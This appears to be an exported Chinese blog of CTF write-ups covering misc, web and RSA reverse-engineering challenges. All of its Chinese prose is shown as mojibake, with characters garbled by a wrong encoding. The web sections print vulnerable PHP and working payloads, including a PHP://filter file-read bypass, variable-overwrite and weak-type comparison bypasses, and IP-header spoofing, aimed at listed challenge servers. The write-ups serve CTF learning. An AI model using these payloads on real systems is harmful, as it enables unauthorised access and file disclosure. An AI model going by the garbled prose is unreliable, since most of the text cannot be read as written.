†base64ï¼Œå†è§£ä¸€ä¸‹å°±æ˜¯base32,å†è§£ä¸€ä¸‹16è¿›åˆ¶ï¼Œå°±æ˜¯è¿™æ ·ä¸€ç›´è§£ä¸‹å»å°±å¥½</p><h3 id="æš´åŠ›XXä¸å¯å–"><a href="#æš´åŠ›XXä¸å¯å–" class="headerlink" title="æš´åŠ›XXä¸å¯å–"></a>æš´åŠ›XXä¸å¯å–</h3><p>è¿™é“é¢˜ç›®è€ƒäº†ä¸€ä¸ªzipåŒ…çš„ä¼ªåŠ å¯†ï¼Œç„¶åç›´æ¥å‡¯æ’’è§£å¯†å°±å¥½ã€‚ã€‚ã€‚å¾ˆç®€å•</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="æ¯”è¾ƒæ•°å­—å¤§å°"><a href="#æ¯”è¾ƒæ•°å­—å¤§å°" class="headerlink" title="æ¯”è¾ƒæ•°å­—å¤§å°"></a>æ¯”è¾ƒæ•°å­—å¤§å°</h3><p>ç›´æ¥æ”¹å‰ç«¯ä»£ç å°±å¥½ï¼Œæ”¹å¤§ä¸€ç‚¹<br><img src="https://s1.ax1x.com/2018/05/25/CfUjYD.png" alt="CfUjYD.png"><br>ç„¶åè¾“å…¥æ•°å­—ï¼Œå¾—åˆ°flag</p><h3 id="æœ¬åœ°çš„è¯±æƒ‘"><a href="#æœ¬åœ°çš„è¯±æƒ‘" class="headerlink" title="æœ¬åœ°çš„è¯±æƒ‘"></a>æœ¬åœ°çš„è¯±æƒ‘</h3><p>è¿™é¢˜å¾ˆç®€å•ï¼Œç›´æ¥æ”¹xffä¸º127.0.0.1å³å¯</p><h3 id="ä½ èƒ½è·¨è¿‡å»å—ï¼Ÿ"><a href="#ä½ èƒ½è·¨è¿‡å»å—ï¼Ÿ" class="headerlink" title="ä½ èƒ½è·¨è¿‡å»å—ï¼Ÿ"></a>ä½ èƒ½è·¨è¿‡å»å—ï¼Ÿ</h3><p>æ‰“å¼€å‘ç°ä¸€æ®µç±»ä¼¼base64çš„ä¸œè¥¿ï¼Œé¦–å…ˆè¦æŠŠè¿™ä¸œè¥¿urlç¼–ç ä¹‹åå†è§£base64ï¼Œå‘ç°ä¸€æ®µä»¥+å¼€å¤´ä»¥-ç»“å°¾çš„ç¼–ç ï¼Œutf7ç¼–ç ï¼Œç»™ä¸ªè§£ç ç½‘å€ <a href="http://toolswebtop.com/text/process/decode/utf-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/decode/utf-7</a></p><p>å¾—åˆ° <code>&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script&gt;</code><br>æŠŠ<code>/%nsfocusXSStest%/</code>æäº¤åˆ°æ–‡æœ¬æ¡†é‡Œå°±å¯ä»¥å¾—åˆ°flagäº†</p><h3 id="ä½ èƒ½ç»•è¿‡å—"><a href="#ä½ èƒ½ç»•è¿‡å—" class="headerlink" title="ä½ èƒ½ç»•è¿‡å—?"></a>ä½ èƒ½ç»•è¿‡å—?</h3><p>è¿™ä¸ªé¢˜ç›®è€ƒçš„æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåˆ©ç”¨få‚æ•°è¯»å–ï¼Œæ ¹æ®få‚æ•°çŒœæµ‹åå°ä¸ºinclude(â€˜æ–‡ä»¶åâ€™.â€™phpâ€™) ,å°è¯•ç”¨ä¼ªåè®®æŠŠæºç è¯»å‡ºæ¥ï¼Œä½†é¢˜ç›®è¯´äº†è¦ç»•è¿‡ï¼Œè‚¯å®šä¸ç®€å•<br>è¿™é‡Œæˆ‘ä»¬ç”¨å¤§å†™å»ç»•è¿‡ï¼Œè¯»å–index.php<br><a href="http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="noopener">http://118.190.152.202:8008/index.php?f=PHP://filter/read=convert.base64-encode/resource=index&amp;id=2</a><br>å¾—åˆ°ä¸€ä¸²base64ï¼Œè§£ç ä¹‹åå¾—åˆ°flag</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>æ”¹ä¸€ä¸‹Client-ip:127.0.0.1 å‘åŒ…å°±å¾—åˆ°flag</p><h3 id="ä¸€åˆ‡éƒ½æ˜¯å¥—è·¯"><a href="#ä¸€åˆ‡éƒ½æ˜¯å¥—è·¯" class="headerlink" title="ä¸€åˆ‡éƒ½æ˜¯å¥—è·¯"></a>ä¸€åˆ‡éƒ½æ˜¯å¥—è·¯</h3><p>è¿™ä¸ªé¢˜æ˜¯ä»£ç å®¡è®¡é¢˜ç›®ï¼Œæºç åœ¨index.php.txt é‡Œé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line"><span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è¿™ä¸€é¢˜è¿˜æ˜¯æ‡µï¼Œä¸çŸ¥é“flagç©¶ç«Ÿæ”¾åœ¨å“ªä¸ªå˜é‡é‡Œé¢ï¼Œç»è¿‡æç¤ºæ˜¯åœ¨$flagé‡Œé¢ï¼Œæœ‰ç¡®å®šçš„ç›®æ ‡å°±å¾ˆå¥½åšäº†<br>å‘ç°ä»£ç é‡Œé¢æœ‰ä¸¤ä¸ª<code>$</code>,åˆ©ç”¨äº†å˜é‡è¦†ç›–æŠŠflagå‚æ•°é‡Œé¢çš„å†…å®¹æ”¹æ‰ï¼Œç„¶åæœ€ååˆ©ç”¨dieå‡½æ•°æŠŠflagé‡Œé¢çš„å†…å®¹æ‰“å°å‡ºæ¥<br>æˆ‘ä»¬å¾—å…ˆè·å¾—<code>$flag</code>å˜é‡é‡Œé¢çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨getçš„å˜é‡è¦†ç›–æŠŠé‡Œé¢çš„å†…å®¹èµ‹å€¼åˆ°<code>$_200</code>è¿™ä¸€ä¸ªå˜é‡é‡Œé¢ï¼Œè¿™æ ·å°±å¯ä»¥å……åˆ†åˆ©ç”¨<code>die</code>è¿™ä¸€ä¸ªå‡½æ•°äº†<br>ç„¶åä¸‹é¢ç´§æ¥ç€ä¸€ä¸ªpostçš„å˜é‡è¦†ç›–è¿˜æœ‰ä¸€ä¸ªpostçš„åˆ¤æ–­ï¼Œä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å¹¶ä¸çŸ¥é“<code>$flag</code> é‡Œé¢çš„å†…å®¹ï¼Œæˆ‘ä»¬åªèƒ½åˆ©ç”¨å˜é‡è¦†ç›–æ”¹å˜<code>$flag</code>é‡Œé¢çš„å†…å®¹ï¼Œè¿™ä¹Ÿè¯´æ˜äº†<code>$flag</code>è¿™ä¸ªå˜é‡æ˜¯å¯æ§çš„ã€‚ã€‚æˆ‘ä»¬å¯ä»¥éšæ„çš„ä¿®æ”¹å¹¶ä¸”ç»•è¿‡åˆ¤æ–­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°flagäº†<br> payload:<br>getæ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8009?_200=flag</span><br></pre></td></tr></table></figure><p>postæ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=1</span><br></pre></td></tr></table></figure><h3 id="phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h3><p>é¦–å…ˆè¿›å»ç¬¬ä¸€å…³æ˜¯MD5å¼±ç±»å‹æ¯”è¾ƒï¼Œç›´æ¥æ‰¾ä¸€ä¸ªQNKCDZOä»£å…¥å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123; </span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>]; </span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    $username=<span class="string">"hello"</span>; </span><br><span class="line">    $password=<span class="string">"hello"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(md5($password) == <span class="number">0</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"xxxxx"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³å‘ç°ä¸¤ä¸ª$ï¼Œäºæ˜¯å°è¯•ä¸€æ³¢<code>GLOBALS</code>å…¨å±€å˜é‡ï¼Œgetä¸€ä¸ª<code>a=GLOBALS</code> ç›´æ¥å‡ºflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span><br><span class="line">$a = @$_REQUEST[<span class="string">'a'</span>]; </span><br><span class="line">str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$a); </span><br><span class="line">str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$a); </span><br><span class="line">@<span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>); </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/25/CfaFTf.png" alt="CfaFTf.png"></p><h3 id="è¯·pingæˆ‘çš„ip-çœ‹ä½ èƒ½Pingé€šå—ï¼Ÿ"><a href="#è¯·pingæˆ‘çš„ip-çœ‹ä½ èƒ½Pingé€šå—ï¼Ÿ" class="headerlink" title="è¯·pingæˆ‘çš„ip çœ‹ä½ èƒ½Pingé€šå—ï¼Ÿ"></a>è¯·pingæˆ‘çš„ip çœ‹ä½ èƒ½Pingé€šå—ï¼Ÿ</h3><p>éé¢„æœŸè§£<br>ç›´æ¥ä¸Šå¾¡å‰‘æ‰«æç›®å½•å‘ç°æœ‰flag.txtè®¿é—®å³å¯</p><p>é¢„æœŸè§£<br>å¥½åƒæ˜¯åˆ©ç”¨pingå‚æ•°å»æ‰§è¡Œå„ç§å‘½ä»¤ï¼Œç”¨%0aå»ç»•è¿‡å¥½åƒã€‚ã€‚ã€‚æ²¡æœ‰è¯¦ç»†å»å°è¯•</p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>è¿™ä¹Ÿæ˜¯ä¸ªä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œé¢˜ç›®éšè—åœ¨index.php.txté‡Œé¢ï¼Œå‘ç°å‡ºé¢˜äººå¾ˆå–œæ¬¢æŠŠæºä»£ç æ”¾åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢å•Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"***********"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</span><br><span class="line">$a = fla;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] &gt; <span class="number">999</span>)&#123;</span><br><span class="line">$b = g;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;very good!Password is right&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too little&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password too long&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;p&gt;Password is not numeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($a.$b == <span class="string">"flag"</span>)</span><br><span class="line"><span class="keyword">print</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¾ˆç®€å•çš„ç»•è¿‡ï¼Œåªæ˜¯ç»„åˆè¿™æ¥è€ƒæŸ¥æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ç»•è¿‡è¿˜æœ‰æ•°ç»„ç»•è¿‡</p><p>é¦–å…ˆè¿™ä¸ªå‡½æ•°<code>strcasecmp</code>å‡ºç°åœ¨<code>==</code>åé¢ï¼Œä¸€æ—¦<code>==</code>å‡ºç°æˆ‘ä»¬å°±è¦è­¦æƒ•äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿è¿™ä¸ªå‡½æ•°æŠ¥é”™ç„¶åä½¿ä¹‹æ»¡è¶³å¼±ç±»å‹<code>0 == false</code>è¿™æ ·å°±ç»•è¿‡äº†ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œä½¿<code>$a=fla</code>ï¼Œè¿™æ˜¯ä¸ºäº†ä½¿åé¢çš„<br><code>if ($a.$b == &quot;flag&quot;)</code>ï¼Œç„¶ååœ¨å®¡è®¡ä¸‹é¢çš„<code>password</code>éƒ¨åˆ†ï¼Œpasswordçš„éƒ¨åˆ†å…¶å®å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„æ•°å­—ç»•è¿‡çš„ä»£ç å®¡è®¡é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ç”¨ç§‘å­¦è®¡æ•°æ³•å»ç»•è¿‡ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>9e9</code>,æ‰€ä»¥æˆ‘æœ€åçš„payloadä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.152.202:8017/?username[]=123&amp;password=9e9</span><br></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•å•Š"><a href="#ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•å•Š" class="headerlink" title="ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•å•Š"></a>ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•å•Š</h3><p>è¿™ä¸€é¢˜æ ¹æ®é¢˜ç›®ç»™çš„æç¤ºæŠŠrefererè¿˜æœ‰å„ç§æœ‰å…³ipçš„å‚æ•°éƒ½æ”¹æ‰å‘åŒ…å‘ç°ä¸€ä¸ªå¥‡æ€ªçš„åœ°å€<br><img src="https://s1.ax1x.com/2018/05/25/CfaPmt.png" alt="CfaPmt.png"><br>æ‰“å¼€åœ°å€çš„æºä»£ç å‘ç°æœ‰ä¸€æ®µå¥‡æ€ªçš„base64<br><img src="https://s1.ax1x.com/2018/05/25/CfaVfg.png" alt="CfaVfg.png"><br>è§£ç å‘ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;password:xinyiji.com&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯å¯†ç ï¼Œè¾“å…¥å°±å¾—åˆ°flag</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="RSA256"><a href="#RSA256" class="headerlink" title="RSA256"></a>RSA256</h3><p>è¿™ä¸ªé¢˜å®Œå…¨è€ƒçš„ä¸æ˜¯é€†å‘ï¼Œå®Œå®Œå…¨å…¨çš„å¯†ç å­¦RSA<br>æ‰“å¼€å‘ç°ä¸€ä¸ªå…¬é’¥æ–‡ä»¶<br>ç”¨OpenSSLæ‰“å¼€å…¬é’¥æ–‡ä»¶å¾—åˆ°ä»–çš„æ¨¡æ•°nï¼Œäºæ˜¯å»factordb.comåˆ†è§£ä¸€æ³¢æ¨¡æ•°<br>å¾—åˆ°på’Œq<br>ç„¶åå¸¸è§„æ“ä½œå¾—åˆ°ç§˜é’¥d<br>ç„¶åç”¨rsa-toolå¾—åˆ°ç§˜é’¥æ–‡ä»¶ï¼Œåˆé‡æ–°ç”¨opensslä»¥ä¸€ä¸ªè§£å¯†å°±å¥½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message1 -inkey key.pem -out flag.txt</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message2 -inkey key.pem -out flag2.txt</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> encrypted.message3 -inkey key.pem -out flag3.txt</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠæ–‡ä»¶é‡å®šå‘ä»¥åå°±å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/25/Cfan6s.png" alt="Cfan6s.png"></p><p>æœ€ååœ¨æ­¤æ±‚ä¸€æ³¢å¤§ä½¬çš„wpå­¦ä¹ å•Šã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’5æœˆèµ›webé¢˜ç›®åšé¢˜è®°å½•</title>
      <link href="/anheng-5month.html"/>
      <url>/anheng-5month.html</url>
      <content type="html"><![CDATA[<h2 id="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"><a href="#å¥‡æ€ªçš„æé¾™ç‰¹æ€§" class="headerlink" title="å¥‡æ€ªçš„æé¾™ç‰¹æ€§"></a>å¥‡æ€ªçš„æé¾™ç‰¹æ€§</h2><p>è¿™æ˜¯ä¸€é“ä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œåˆå‘ç°äº†ä¸€ä¸ªæˆ‘ä»¥å‰æ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥è¯¦ç»†çœ‹çœ‹è¿™ä¸ªé“¾æ¥<br><a href="https://wooyun.shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="noopener">https://wooyun.shuimugan.com/bug/view?bug_no=64792</a><br><a id="more"></a><br><img src="https://s1.ax1x.com/2018/05/24/CWrqSS.png" alt="CWrqSS.png"><br>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œç®€å•ç‚¹è§£é‡Šå°±æ˜¯å½“ä»£ç ä¸­å­˜åœ¨<code>$_REQUEST[&#39;user_id&#39;]</code>é‡Œé¢ç±»ä¼¼çš„å‚æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨urlä¸Šå¯ä»¥è¿™æ ·<code>a.php?user.id</code>ä¼ å‚å»è¿›è¡Œç»•è¿‡,è¿™æ ·è¿›å»ä¹‹åä¹Ÿèƒ½è¡¨ç¤º<code>$_REQUEST[&#39;user_id&#39;]</code>çš„å€¼ï¼ŒåŒæ ·å¯ä»¥ç»•è¿‡çš„ç¬¦å·è¿˜æœ‰<code>+ï¼Œ[</code> ç­‰ï¼Œåº”è¯¥è¯´æ˜¯phpçš„ä¸€ä¸ªå°ç‰¹æ€§ï¼Œä¸Šé¢è®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é˜…è¯»ä»£ç å‘ç°ï¼Œé¦–å…ˆç¬¬ä¸€æ­¥è¦ç»•è¿‡A_Aè¿™ä¸ªç¬¦å·ï¼Œå¦‚æœå‡ºç°è¿™ä¸ªç¬¦å·ä»–å°±ä¼šæ˜¾ç¤º<code>A_A,have fun</code>ï¼Œå°±ä¸èƒ½ç»§ç»­å¾€ä¸‹é¢æ‰§è¡Œåˆ°<code>file_get_contents(&#39;flag.php&#39;)</code>äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘é€getå‚æ•°çš„æ—¶å€™åˆå¿…é¡»è¦å‘é€ï¼Œå› æ­¤æˆ‘ä»¬å°±ç”¨åˆ°åˆšæ‰çš„çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>A.A</code>æˆ–è€…æ˜¯<code>A+A</code>å»ä¼ å‚å»ç»•è¿‡ã€‚<br>ä¸‹é¢çš„ä»£ç å°±æ˜¯å¸¸è§„çš„æ•°å­—ç»•è¿‡äº†ï¼Œä½†è¿™é‡Œä¹Ÿç”¨åˆ°äº†ä¸€ä¸ªtrickï¼Œå°±æ˜¯æ— è®ºä½ çš„æ•°å­—å¤šå¤§ï¼Œå¯¹äºæ•°ç»„è€Œè¨€æ€»æ˜¯æ¯”æ•°ç»„å°ï¼Œä¸‹é¢æ˜¯æ“ä½œ<br><img src="https://s1.ax1x.com/2018/05/24/CWrXLj.png" alt="CWrXLj.png"><br>æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„å»ç»•è¿‡<code>$str&lt;9999999999</code>çš„ç‰¹æ€§ï¼Œä¸‹é¢ä¸€ä¸ªåˆ¤æ–­æ˜¯å¼ºåˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²åœ¨ä¸æ•°å­—æ¯”è¾ƒçš„åˆ¤æ–­ï¼Œè¿™å°±æ˜¯å¹³å¸¸æ“ä½œå¾ˆå¤šçš„å¼±ç±»å‹äº†ï¼Œç›´æ¥è®©å‚æ•°ç­‰äºadminå°±å¯ä»¥äº†ï¼Œå› ä¸º<code>â€œadminâ€== 0</code> ï¼Œç»“æœæ˜¯trueï¼Œç›´æ¥ç­‰äº0ç»•è¿‡å³å¯ï¼Œæ‰€ä»¥è¿™é¢˜çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10007/?A+A[]=admin</span><br></pre></td></tr></table></figure><h2 id="ä¸èƒ½æ³¨å†Œçš„admin"><a href="#ä¸èƒ½æ³¨å†Œçš„admin" class="headerlink" title="ä¸èƒ½æ³¨å†Œçš„admin"></a>ä¸èƒ½æ³¨å†Œçš„admin</h2><p>è¿™ä¸€ä¸ªé¢˜ç›®åˆ©ç”¨äº†Windowsä¸åŒºåˆ†å¤§å°å†™ç‰¹æ€§çš„ç‰¹ç‚¹<br>å³é”®å‘ç°å‘ç°æœ‰ä¸€æ®µä»£ç å¾ˆå¯ç–‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span 